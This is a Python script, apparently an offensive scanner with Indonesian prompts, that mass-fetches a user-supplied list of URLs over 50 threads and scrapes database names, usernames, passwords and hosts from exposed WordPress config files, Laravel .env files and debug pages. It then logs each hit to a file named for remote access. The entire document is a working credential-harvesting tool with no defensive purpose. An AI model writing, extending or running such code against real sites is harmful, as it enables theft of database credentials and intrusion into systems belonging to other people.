import re
import requests
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore, Style
from bs4 import BeautifulSoup

def extract_info(url):
    try:
        response = requests.get(url.strip())
        content = response.text

        dbname = re.search(r"define\('DB_NAME',\s*'([^']+)'\);", content) or re.search(r"DB_DATABASE=(.*)\n", content)
        dbuser = re.search(r"define\('DB_USER',\s*'([^']+)'\);", content) or re.search(r"DB_USERNAME=(.*)\n", content)
        dbpass = re.search(r"define\('DB_PASSWORD',\s*'([^']+)'\);", content) or re.search(r"DB_PASSWORD=(.*)", content)
        host = re.search(r"define\('DB_HOST',\s*'([^']+)'\);", content) or re.search(r"DB_HOST=(.*)\n", content)

        if not all((dbname, dbuser, dbpass, host)):
            soup = BeautifulSoup(content, 'html.parser')

            db_database = soup.find('td', string='DB_DATABASE') and soup.find('td', string='DB_DATABASE').find_next_sibling('td').text.strip('"')
            db_username = soup.find('td', string='DB_USERNAME') and soup.find('td', string='DB_USERNAME').find_next_sibling('td').text.strip('"')
            db_password = soup.find('td', string='DB_PASSWORD') and soup.find('td', string='DB_PASSWORD').find_next_sibling('td').text.strip('"')
            db_host = soup.find('td', string='DB_HOST') and soup.find('td', string='DB_HOST').find_next_sibling('td').text.strip('"')

            return (db_database, db_username, db_password, db_host)

        with open('output/listforremote.txt', 'a') as f:
            f.write(f"{url.strip()}|{dbname.group(1)}|{dbuser.group(1)}|{dbpass.group(1)}|{host.group(1)}".replace('"\n\n', '').replace('"\n', '') + "\n")
        print(f"{Fore.GREEN}Found:{Style.RESET_ALL} {url.strip()}")

    except Exception as e:
        print(f"{Fore.RED}Error:{Style.RESET_ALL} {url.strip()}")


filename = input("Masukkan nama file yang ingin diproses: ")

with open(filename, 'r') as f:
    urls = [url.strip() for url in f.readlines()]

n_threads = 50
pool = ThreadPool(n_threads)
results = pool.map(extract_info, urls)
pool.close()
pool.join()


print("Selesai! Hasil pencarian disimpan dalam file output/listforremote.txt.")
